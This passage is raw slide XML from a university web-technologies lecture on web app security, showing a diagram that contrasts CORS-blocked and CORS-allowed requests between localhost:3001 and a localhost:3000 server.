                    <a:pt x="0" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4465320" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="57150"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5022341" y="3871722"/>
              <a:ext cx="6287770" cy="0"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6287770" h="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6287262" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="D70031"/>
              </a:solidFill>
              <a:prstDash val="sysDash"/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1" name="object 11" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9525000" y="4206240"/>
            <a:ext cx="1792605" cy="1971039"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006379"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00252F"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="15938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255"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr sz="1800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</a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>localhost:3000</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" marL="403860" marR="394335">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="2165"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(sets</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CORS </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>headers)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12" name="object 12" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5022341" y="2865120"/>
            <a:ext cx="4503420" cy="2786380"/>
            <a:chOff x="5022341" y="2865120"/>
            <a:chExt cx="4503420" cy="2786380"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="object 13" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5022342" y="4492751"/>
              <a:ext cx="4503420" cy="1158240"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="4503420" h="1158239">
                  <a:moveTo>
                    <a:pt x="4503420" y="1082040"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="137160" y="1082040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="137160" y="1043940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22860" y="1101090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="137160" y="1158240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="137160" y="1120140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="1120140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="1082040"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="4503420" h="1158239">
                  <a:moveTo>
                    <a:pt x="4503420" y="57150"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4465320" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4465320" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="57150"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5448299" y="2865120"/>
              <a:ext cx="3619500" cy="914400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3619500" h="914400">
                  <a:moveTo>
                    <a:pt x="3619500" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3619500" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361950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5" name="object 15" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5448300" y="2865120"/>
            <a:ext cx="3619500" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="80010" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="630"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>200</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OK</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{"data":</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"hi"}</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="object 16" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5463540" y="4969764"/>
            <a:ext cx="3619500" cy="1207135"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3619500" h="1207135">
                <a:moveTo>
                  <a:pt x="3619500" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1207008"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3619500" y="1207008"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361950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object 17" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5463540" y="4969764"/>
            <a:ext cx="3619500" cy="1207135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="105410" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="830"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>200</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OK</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Access-Control-Allow-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Origin:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="45" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-50" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{"data":</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"hi"}</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="object 18" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5055870" y="3055111"/>
            <a:ext cx="399415" cy="574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600" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A10025"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI Symbol"/>
                <a:cs typeface="Segoe UI Symbol"/>
              </a:rPr>
              <a:t>✘</a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:latin typeface="Segoe UI Symbol"/>
              <a:cs typeface="Segoe UI Symbol"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="object 19" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5463540" y="1807464"/>
            <a:ext cx="3619500" cy="654050"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3619500" h="654050">
                <a:moveTo>
                  <a:pt x="3619500" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="653796"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3619500" y="653796"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361950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0" name="object 20" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5463540" y="1807464"/>
            <a:ext cx="3619500" cy="654050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="72390" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="570"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/data</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Origin:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://localhost:3001</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="object 21" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5448300" y="4206240"/>
            <a:ext cx="3619500" cy="654050"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3619500" h="654050">
                <a:moveTo>
                  <a:pt x="3619500" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="653795"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3619500" y="653795"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361950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2" name="object 22" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5448300" y="4206240"/>
            <a:ext cx="3619500" cy="654050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="73025" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/data</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Origin:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://localhost:3001</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="object 25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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="object 23" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9310243" y="1486661"/>
            <a:ext cx="1935480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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CORS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35" b="1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1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>blocked</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-45" b="1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1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>scenario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24" name="object 24" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9299575" y="3882390"/>
            <a:ext cx="1946275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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CORS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-40" b="1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1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-80" b="1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1600" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>scenario</a:t>
            </a:r>
            <a:endParaRPr sz="16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8606028" y="710691"/>
            <a:ext cx="2734310" cy="2474595"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2734309" h="2474595">
                <a:moveTo>
                  <a:pt x="371856" y="2255774"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="328142" y="2238514"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="290258" y="2206929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="257644" y="2166010"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="229755" y="2120735"/>
                </a:lnTo>
                <a:lnTo>
